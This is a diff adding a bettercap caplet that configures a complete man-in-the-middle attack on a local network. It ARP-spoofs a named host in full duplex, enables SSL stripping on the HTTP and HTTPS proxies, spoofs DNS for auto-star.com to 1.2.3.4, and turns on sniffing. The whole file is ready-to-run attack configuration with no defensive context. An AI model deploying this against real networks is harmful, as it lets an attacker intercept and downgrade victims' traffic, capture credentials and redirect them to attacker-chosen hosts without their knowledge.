@@ -1,0 +1,17 @@
+# USAGE: bettercap -caplet dns.cap    (make sure you are in the current dir, or enter full path)
+
+set arp.spoof.targets 192.168.0.170
+set arp.spoof.fullduplex true
+set http.proxy.sslstrip true
+set https.proxy.sslstrip true
+#set net.sniff.verbose false
+set dns.spoof.domains auto-star.com
+set dns.spoof.address 1.2.3.4
+#set dns.spoof.all true
+events.ignore net.sniff.mdns
+events.ignore endpoint.new
+events.ignore endpoint.lost
+arp.spoof on
+http.proxy on
+dns.spoof on
+net.sniff on
